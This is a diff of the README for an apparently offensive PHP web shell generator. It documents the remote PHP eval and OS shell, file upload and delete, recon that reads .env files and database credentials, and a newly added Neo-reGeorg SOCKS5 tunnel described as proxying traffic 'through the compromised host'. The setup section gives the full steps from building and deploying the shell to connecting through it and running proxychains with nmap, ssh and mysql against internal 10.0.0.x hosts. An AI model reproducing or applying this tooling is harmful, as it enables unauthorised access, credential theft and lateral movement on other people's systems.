@@ -6,13 +6,11 @@ A modular, single-file web shell framework with a build generator. Development h
 
 ## Features
 
-- **PHP Console** — execute PHP code with output capture
-- **OS Shell** — auto-detected system command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD and command history
-- **Network Scanner** — CIDR-based port scanning with non-blocking sockets
-- **Service Fingerprinting** — banner grabbing + protocol-aware probes for SSH, FTP, SMTP, HTTP, MySQL, Redis, PostgreSQL, MongoDB, Memcached, Elasticsearch, and more. TLS certificate extraction with SAN enumeration
-- **File Browser** — navigate, download, upload, and delete files
-- **System Diagnostics** — full recon: identity, SUID binaries, writable dirs, ARP table, open ports, routing, installed panels, DB credentials, process list
-- **Pivot Map** — visual network topology with per-host fingerprinting, service versions, OS hints, TLS details, and raw banner inspection
+- **PHP Console** — execute PHP code with error handling, configurable timeout, and fatal error recovery
+- **OS Shell** — auto-detected system command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD, output size cap, and command history
+- **SOCKS5 Tunnel** — embedded Neo-reGeorg tunnel endpoint for proxying traffic through the compromised host. Use with `neoreg.py` client + `proxychains` for nmap, SSH, database clients, etc.
+- **File Browser** — navigate, download, upload, and delete files. Shows size, mtime, owner:group, permissions, symlink targets, and R/W flags
+- **System Diagnostics** — full recon: identity, container detection, binary directories, interpreters/tools, writable dirs, ARP table, open ports (IPv4+IPv6), routing, installed panels (19+), .env file contents, process list
 - **Command History** — persistent history with re-run and export
 - **IndexedDB Storage** — all client data persists in the browser with full export/import
 
@@ -25,8 +23,12 @@ python generate.py
 # Password-protected, minified, with operator fingerprint
 python generate.py --password s3cret --minify --seed "op-nighthawk"
 
+# With Neo-reGeorg tunnel embedded
+python3 neoreg.py -g -k tunnelpass           # Generate tunnel files
+python generate.py --tunnel neoreg_servers/tunnel.php --password s3cret
+
 # Minimal build — exclude optional modules
-python generate.py --exclude scanner,pivot,diagnostics
+python generate.py --exclude tunnel,diagnostics
 
 # Verify a shell's integrity
 python generate.py --verify dist/shell_a3f8c1e2.php
@@ -41,6 +43,7 @@ Output lands in `dist/`. Deploy the single `.php` file to a web server.
 | `--lang php` | Target language (default: `php`) |
 | `--password SECRET` | Bake in password protection (SHA256 hash embedded) |
 | `--seed STRING` | Operator seed for unique fingerprinting |
+| `--tunnel FILE` | Path to Neo-reGeorg generated `tunnel.php` (from `neoreg.py -g`) |
 | `--minify` | Strip comments and collapse whitespace |
 | `--exclude MODULES` | Comma-separated modules to exclude |
 | `--output NAME` | Custom output filename |
@@ -52,12 +55,43 @@ Output lands in `dist/`. Deploy the single `.php` file to a web server.
 |--------|----------|-------------|
 | `console` | Yes | PHP eval + OS shell |
 | `files` | Yes | File browser, upload, delete, download |
-| `scanner` | No | CIDR port scanner with async sockets |
+| `tunnel` | No | Neo-reGeorg SOCKS5 tunnel endpoint |
 | `diagnostics` | No | System recon, privesc hints, network info |
 | `history` | No | Command history viewer |
-| `pivot` | No | Visual network map from scan data |
 
-Exclude optional modules with `--exclude scanner,pivot,history,diagnostics` for a smaller footprint.
+Exclude optional modules with `--exclude tunnel,history,diagnostics` for a smaller footprint.
+
+## SOCKS5 Tunnel
+
+The tunnel embeds a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) endpoint directly into the webshell. This allows the operator to proxy TCP traffic through the compromised host using their own tools.
+
+### Setup
+
+```bash
+# 1. Generate Neo-reGeorg tunnel with a key
+python3 neoreg.py -g -k mypassword
+
+# 2. Build webshell with tunnel embedded
+python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass
+
+# 3. Deploy the shell, then connect
+python3 neoreg.py -u https://target.com/shell.php -k mypassword
+
+# 4. Use proxychains with any tool
+proxychains nmap -sT -sV 10.0.0.0/24
+proxychains ssh user@10.0.0.5
+proxychains mysql -h 10.0.0.3 -u root -p
+```
+
+### What works through the tunnel
+
+| Works | Doesn't work |
+|-------|-------------|
+| TCP connect scans (`nmap -sT`) | SYN scans (`nmap -sS`) — needs raw sockets |
+| Service fingerprinting (`nmap -sV`) | UDP scans — SOCKS5 is TCP only |
+| HTTP tools (curl, sqlmap, gobuster) | ICMP/ping sweeps — raw packets |
+| DB clients (mysql, psql, redis-cli) | OS fingerprinting (`nmap -O`) |
+| SSH, netcat, socat | ARP scanning — Layer 2 |
 
 ## Build Fingerprint
 
@@ -88,44 +122,6 @@ python generate.py --password "hunter2"
 
 Logout via `?logout` query parameter.
 
-## Service Fingerprinting
-
-The Pivot Map includes per-host service fingerprinting. Click **Fingerprint** on any host card (or **Fingerprint All** in the summary bar) to probe every open port.
-
-### What it detects
-
-| Protocol | Method | Extracted Info |
-|----------|--------|---------------|
-| SSH | Passive banner | Product, version, OS (Ubuntu, Debian, FreeBSD) |
-| FTP | Passive banner | Server software (vsFTPd, ProFTPD, FileZilla, etc.) |
-| SMTP | Passive banner | MTA (Postfix, Exim, Exchange, Sendmail) |
-| POP3/IMAP | Passive banner | Server software (Dovecot, etc.) |
-| HTTP/HTTPS | `HEAD /` probe | Server header, X-Powered-By, cookies, framework detection |
-| MySQL/MariaDB | Passive greeting | Version string, MariaDB vs MySQL |
-| Redis | `PING` probe | Version via `+PONG` / `INFO` |
-| PostgreSQL | SSL probe | SSL support detection |
-| MongoDB | Passive greeting | Version |
-| Elasticsearch | `GET /` probe | Cluster name, version |
-| Memcached | `stats` probe | Version |
-| Telnet | Passive banner | Login prompt / device info |
-| TLS (443, 8443) | Certificate extraction | Subject CN, Issuer, SANs, validity, self-signed detection |
-
-### Framework detection via cookies
-
-| Cookie Name | Framework |
-|-------------|-----------|
-| `PHPSESSID` | PHP |
-| `JSESSIONID` | Java |
-| `ASP.NET_SessionId` | ASP.NET |
-| `connect.sid` | Node/Express |
-| `laravel_session` | Laravel |
-| `csrftoken` | Django |
-| `rack.session` / `_rails` | Ruby/Rails |
-
-### Pivot Map card example
-
-Each fingerprinted host shows a table with port, service, version, info badges (OS, framework, powered-by), TLS details (CN, CA, SANs, validity), and a collapsible raw banner.
-
 ## Project Structure
 
 ```
@@ -138,7 +134,7 @@ Webshells/
 │   │   ├── _order.json             # Assembly order
 │   │   ├── auth.php                # Session auth (injected by generator)
 │   │   ├── download.php            # GET file download handler
-│   │   ├── scanner.php             # CIDR port scanner
+│   │   ├── tunnel.php              # Neo-reGeorg tunnel (injected by generator)
 │   │   ├── filebrowser.php         # Directory listing
 │   │   ├── fileops.php             # Delete + upload
 │   │   ├── eval.php                # PHP code execution
@@ -152,11 +148,10 @@ Webshells/
 │   │   │   ├── db.js               # IndexedDB CRUD + export/import
 │   │   │   ├── console.js          # PHP console UI
 │   │   │   ├── shell.js            # OS shell UI + auto-probe
-│   │   │   ├── scanner.js          # Scanner UI
+│   │   │   ├── tunnel.js           # Tunnel status + instructions
 │   │   │   ├── diagnostics.js      # Diagnostics renderer
 │   │   │   ├── history.js          # History viewer
-│   │   │   ├── filebrowser.js      # File browser UI
-│   │   │   └── pivotmap.js         # Pivot map visualization
+│   │   │   └── filebrowser.js      # File browser UI
 │   │   └── html/layout.html        # HTML layout with module markers
 │   └── config/defaults.json        # Version + module definitions
 ├── dist/                           # Generated shells (gitignored)
@@ -177,14 +172,12 @@ To add a new language:
 
 | Action | POST Params | Response |
 |--------|-------------|----------|
-| `scan` | `cidr`, `port` | `{"open": ["ip:port", ...], "total": N}` |
-| `fingerprint` | `host`, `port` | `{"service": "SSH", "version": "OpenSSH_8.2p1", "banner": "...", "info": [...], "tls": {...}}` |
-| `ls` | `dir` | `{"dir": "/path", "entries": [...]}` |
+| `ls` | `dir` | `{"dir": "/path", "entries": [{name, path, dir, size, mtime, owner, group, perms, readable, writable, symlink, link_target, broken}, ...]}` |
 | `delete` | `path` | `{"ok": true}` or `{"error": "msg"}` |
-| `upload` | `dir`, `file` | `{"ok": true, "path": "..."}` or `{"error": "msg"}` |
-| `eval` | `code` | `{"output": "..."}` |
-| `shell` | `cmd`, `cwd` | `{"output": "...", "cwd": "/new/path", "method": "system", "available": true}` |
-| `diag` | — | `{"php_version": "...", "os": "...", ...}` |
+| `upload` | `dir`, `file` | `{"ok": true, "path": "...", "size": N, "overwritten": bool}` or `{"error": "msg"}` |
+| `eval` | `code`, `timeout` | `{"output": "...", "error": "..."}` |
+| `shell` | `cmd`, `cwd`, `timeout` | `{"output": "...", "cwd": "/new/path", "method": "system", "available": true, "truncated": bool}` |
+| `diag` | — | `{"php_version": "...", "os": "...", "container": {...}, "bin_dirs": [...], "interpreters": [...], "env_files": {...}, ...}` |
 | GET `?download=` | path in query | Raw file stream |
 
 ## Keyboard Shortcuts
@@ -199,7 +192,7 @@ To add a new language:
 ## Requirements
 
 - **Generator:** Python 3.6+ (stdlib only, zero dependencies)
-- **Runtime:** PHP 5.6+ with `sockets` extension (for scanner)
+- **Runtime:** PHP 5.6+ (socket functions needed for tunnel)
 - **Browser:** Any modern browser with IndexedDB support
 
 ## License
